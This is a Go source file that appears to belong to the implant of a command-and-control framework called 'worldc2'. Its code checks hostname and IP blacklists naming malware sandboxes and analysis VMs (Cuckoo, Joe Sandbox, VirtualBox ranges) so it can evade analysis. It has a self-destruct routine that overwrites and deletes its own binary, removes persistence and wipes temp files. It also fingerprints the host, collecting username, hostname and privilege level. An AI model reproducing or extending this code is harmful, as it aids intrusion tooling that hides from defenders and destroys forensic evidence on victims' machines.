package agent

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"
)

// KillSwitch provides emergency self-destruct capabilities.
type KillSwitch struct {
	enabled     bool
	triggerFile string
	maxAge      time.Duration
	checkInterval time.Duration
}

// NewKillSwitch creates a new kill switch handler.
func NewKillSwitch() *KillSwitch {
	return &KillSwitch{
		enabled:       true,
		maxAge:        30 * 24 * time.Hour, // 30 days default
		checkInterval: 1 * time.Hour,
	}
}

// SetMaxAge sets the maximum operational age before self-destruct.
func (ks *KillSwitch) SetMaxAge(d time.Duration) {
	ks.maxAge = d
}

// SetTriggerFile sets a file that, when created, triggers self-destruct.
func (ks *KillSwitch) SetTriggerFile(path string) {
	ks.triggerFile = path
}

// Check evaluates all kill switch conditions.
// Returns true if the agent should terminate.
func (ks *KillSwitch) Check() bool {
	if !ks.enabled {
		return false
	}

	// Check 1: Maximum age exceeded
	if ks.checkMaxAge() {
		return true
	}

	// Check 2: Trigger file exists
	if ks.checkTriggerFile() {
		return true
	}

	// Check 3: Domain blacklist
	if ks.checkDomainBlacklist() {
		return true
	}

	// Check 4: IP blacklist
	if ks.checkIPBlacklist() {
		return true
	}

	return false
}

func (ks *KillSwitch) checkMaxAge() bool {
	// Check creation time of executable
	exe, err := os.Executable()
	if err != nil {
		return false
	}

	info, err := os.Stat(exe)
	if err != nil {
		return false
	}

	age := time.Since(info.ModTime())
	return age > ks.maxAge
}

func (ks *KillSwitch) checkTriggerFile() bool {
	if ks.triggerFile == "" {
		return false
	}

	_, err := os.Stat(ks.triggerFile)
	return err == nil
}

func (ks *KillSwitch) checkDomainBlacklist() bool {
	blacklist := []string{
		"sandbox",
		"vmware",
		"virtualbox",
		"analysis",
		"malware",
		"cuckoo",
		"joebox",
		"threat",
	}

	hostname, _ := os.Hostname()
	hostname = strings.ToLower(hostname)

	for _, domain := range blacklist {
		if strings.Contains(hostname, domain) {
			return true
		}
	}

	return false
}

func (ks *KillSwitch) checkIPBlacklist() bool {
	// Check if running on known analysis IPs
	// These are commonly used in sandbox environments
	blacklist := []string{
		"10.0.2.",    // VirtualBox NAT
		"192.168.56.", // VirtualBox host-only
		"172.16.",    // Common lab network
	}

	// Get local IPs
	addrs, err := getLocalIPs()
	if err != nil {
		return false
	}

	for _, ip := range addrs {
		for _, bl := range blacklist {
			if strings.HasPrefix(ip, bl) {
				return true
			}
		}
	}

	return false
}

// SelfDestruct securely removes the agent from the system.
func (ks *KillSwitch) SelfDestruct() {
	// 1. Overwrite executable with random data
	exe, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}

	// Overwrite multiple times
	for i := 0; i < 3; i++ {
		data := make([]byte, 1024)
		for j := range data {
			data[j] = byte(j ^ i)
		}

		f, err := os.OpenFile(exe, os.O_WRONLY, 0)
		if err != nil {
			break
		}
		f.Write(data)
		f.Close()
	}

	// 2. Remove persistence
	pm := NewPersistenceManager()
	pm.Remove("worldc2-agent")

	// 3. Delete executable
	os.Remove(exe)

	// 4. Clean up temp files
	cleanupTempFiles()

	// 5. Exit
	os.Exit(0)
}

func getLocalIPs() ([]string, error) {
	var ips []string

	addrs, err := getNetworkInterfaces()
	if err != nil {
		return ips, err
	}

	for _, info := range addrs {
		if ip, ok := info["ipv4"]; ok {
			ips = append(ips, ip)
		}
	}

	return ips, nil
}

func cleanupTempFiles() {
	patterns := []string{
		"bty_*.tmp",
		"bty_*.ps1",
		"bty_*.sh",
		".bty_*",
	}

	tmpDir := os.TempDir()

	for _, pattern := range patterns {
		matches, _ := findFiles(tmpDir, pattern)
		for _, f := range matches {
			// Overwrite before deletion
			overwriteFile(f)
			os.Remove(f)
		}
	}
}

func findFiles(dir, pattern string) ([]string, error) {
	var results []string

	entries, err := os.ReadDir(dir)
	if err != nil {
		return results, err
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			matched := matchPattern(pattern, entry.Name())
			if matched {
				results = append(results, dir+"/"+entry.Name())
			}
		}
	}

	return results, nil
}

func matchPattern(pattern, name string) bool {
	// Simple glob matching
	if pattern == "*" {
		return true
	}

	// Handle *.ext patterns
	if strings.HasPrefix(pattern, "*.") {
		ext := strings.TrimPrefix(pattern, "*.")
		return strings.HasSuffix(name, "."+ext)
	}

	// Handle prefix* patterns
	if strings.HasSuffix(pattern, "*") {
		prefix := strings.TrimSuffix(pattern, "*")
		return strings.HasPrefix(name, prefix)
	}

	return pattern == name
}

func overwriteFile(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return err
	}

	data := make([]byte, info.Size())
	for i := range data {
		data[i] = 0x00
	}

	return os.WriteFile(path, data, 0644)
}

// GenerateAgentID creates a unique, persistent agent ID based on hardware fingerprint.
func GenerateAgentID() string {
	fp := Fingerprint()
	hash := sha256.Sum256([]byte(fp + time.Now().Format("2006-01-02")))
	return fmt.Sprintf("worldc2-%s", hex.EncodeToString(hash[:8]))
}

// GetAgentInfo returns comprehensive agent information.
func GetAgentInfo() map[string]interface{} {
	info := make(map[string]interface{})

	info["agent_id"] = GenerateAgentID()
	info["fingerprint"] = Fingerprint()
	info["os"] = runtime.GOOS
	info["arch"] = runtime.GOARCH
	info["hostname"], _ = os.Hostname()
	info["username"] = os.Getenv("USER")
	if info["username"] == "" {
		info["username"] = os.Getenv("USERNAME")
	}
	info["pid"] = os.Getpid()
	info["privilege"] = CheckPrivileges()
	info["cpus"] = runtime.NumCPU()

	// Uptime
	if runtime.GOOS == "linux" {
		data, _ := os.ReadFile("/proc/uptime")
		if len(data) > 0 {
			fields := strings.Fields(string(data))
			if len(fields) > 0 {
				info["uptime_seconds"] = fields[0]
			}
		}
	}

	// Memory
	var mem runtime.MemStats
	runtime.ReadMemStats(&mem)
	info["memory_alloc_mb"] = mem.Alloc / 1024 / 1024

	return info
}
